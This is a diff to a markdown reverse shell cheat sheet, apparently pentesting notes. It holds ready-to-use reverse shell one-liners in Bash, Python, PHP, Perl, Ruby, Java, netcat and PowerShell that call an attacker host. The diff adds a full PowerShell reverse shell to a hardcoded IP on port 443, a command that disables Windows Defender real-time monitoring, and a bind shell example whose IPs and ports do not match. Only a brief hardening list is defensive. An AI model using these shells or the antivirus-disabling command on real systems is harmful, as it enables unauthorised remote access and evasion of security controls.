@@ -1,3 +1,5 @@
+
+
 # 🧰 Reverse Shell Cheat Sheet
 
 ## 📡 Listener Setup & Shell Stabilization
@@ -21,14 +23,29 @@ clear
 
 ---
 
-## 🐚 Bash Reverse Shell
+## Bind Shell
+
+With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).
+
 ```bash
+# Target Server
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+
+# Connect from box
+ncat 10.0.0.1 4242 -e /bin/bash
+
+```
+
+## Bash Reverse Shell
+
+```bash
+# Target
 /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
 ```
 
 ---
 
-## 🐍 Python Reverse Shell
+## Python Reverse Shell
 ```bash
 python -c 'import socket,os,subprocess;
 s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));
@@ -38,7 +55,7 @@ subprocess.call(["/bin/sh","-i"]);'
 
 ---
 
-## 🐘 PHP Reverse Shell
+## PHP Reverse Shell
 ```php
 php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);
 exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -46,7 +63,7 @@ exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ---
 
-## 🧪 Perl Reverse Shell
+## Perl Reverse Shell
 ```perl
 perl -e 'use Socket;
 $i="<ATTACKER_IP>";$p=<PORT>;
@@ -59,7 +76,7 @@ if(connect(S,sockaddr_in($p,inet_aton($i)))){
 
 ---
 
-## 🕸️ Ruby Reverse Shell
+## Ruby Reverse Shell
 ```ruby
 ruby -rsocket -e 'exit if fork;
 c=TCPSocket.new("<ATTACKER_IP>","<PORT>");
@@ -68,7 +85,7 @@ while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
 ---
 
-## ☕ Java Reverse Shell
+## Java Reverse Shell
 ```java
 r = Runtime.getRuntime();
 p = r.exec(new String[]{
@@ -81,7 +98,7 @@ p.waitFor();
 
 ---
 
-## 🔧 Netcat Reverse Shell
+## Netcat Reverse Shell
 ```bash
 rm /tmp/f; mkfifo /tmp/f;
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> <PORT> >/tmp/f
@@ -89,7 +106,7 @@ cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> <PORT> >/tmp/f
 
 ---
 
-## 🪟 PowerShell Reverse Shell (Windows)
+## PowerShell Reverse Shell (Windows)
 ```powershell
 $sm=(New-Object Net.Sockets.TCPClient("<ATTACKER_IP>",<PORT>)).GetStream();
 [byte[]]$bt=0..255|%{0};
@@ -100,9 +117,27 @@ while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){
 }
 ```
 
+## Simple Reverse Shell in Windows
+
+Bind to common port 443 to avoid firewall restrictions
+
+```bash
+# Server setup
+sudo nc -lvnp 443
+```
+
+```powershell
+# Payload on target, RCE cmd.exe
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.178',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Dissable A/V if needed as admin
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+```
+
 ---
 
-## 🔐 Hardening / Detection Notes
+## Hardening / Detection Notes
 - Outbound firewall filtering helps prevent shell callbacks.
 - Remove common interpreters (`bash`, `python`, `php`) when not needed.
 - Use detection rules for outbound socket behavior and reverse shell signatures.
